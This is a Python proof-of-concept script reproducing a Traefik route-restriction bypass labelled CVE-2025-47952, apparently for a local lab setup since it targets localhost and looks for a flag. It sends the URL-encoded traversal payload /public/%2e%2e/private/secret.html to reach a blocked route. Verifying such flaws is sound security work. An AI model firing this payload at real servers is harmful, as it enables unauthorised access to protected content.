#!/usr/bin/env python3
import http.client
import sys

TARGET_HOST = "localhost"
TARGET_PORT = 80

def http_get(path):
    conn = http.client.HTTPConnection(TARGET_HOST, TARGET_PORT)
    conn.request("GET", path)
    resp = conn.getresponse()
    body = resp.read().decode()
    conn.close()
    return resp.status, body

def test_vulnerability():
    print("=" * 60)
    print("CVE-2025-47952: Traefik Path Traversal via URL Encoding")
    print("=" * 60)
    print("\nTraefik only exposes /public route, /private should be blocked")
    
    print("\n[1] Testing /public/index.html (should be accessible)...")
    status, body = http_get("/public/index.html")
    print(f"    Status: HTTP {status}")
    if status == 200:
        print(f"    Content: {body.strip()}")
    
    print("\n[2] Testing /private/secret.html (should return 404 - no route)...")
    status, body = http_get("/private/secret.html")
    print(f"    Status: HTTP {status}")
    if status != 404:
        print(f"    WARNING: Expected 404, got {status}")
    
    print("\n[3] Exploiting: /public/%2e%2e/private/secret.html")
    print("    Using URL-encoded path traversal to bypass route restriction...")
    status, body = http_get("/public/%2e%2e/private/secret.html")
    print(f"    Status: HTTP {status}")
    
    if status == 200 and "FLAG" in body:
        print(f"    Content: {body.strip()}")
        print("\n" + "=" * 60)
        print("VULNERABLE!")
        print("=" * 60)
        print("Successfully accessed /private via path traversal!")
        print("The %2e%2e (../) bypassed Traefik's route restriction.")
        return True
    else:
        print(f"\n[-] Exploit failed (HTTP {status})")
        if body:
            print(f"    Response: {body[:200]}")
        return False

if __name__ == "__main__":
    try:
        result = test_vulnerability()
        sys.exit(0 if result else 1)
    except Exception as e:
        print(f"\n[-] Error: {e}")
        sys.exit(1)
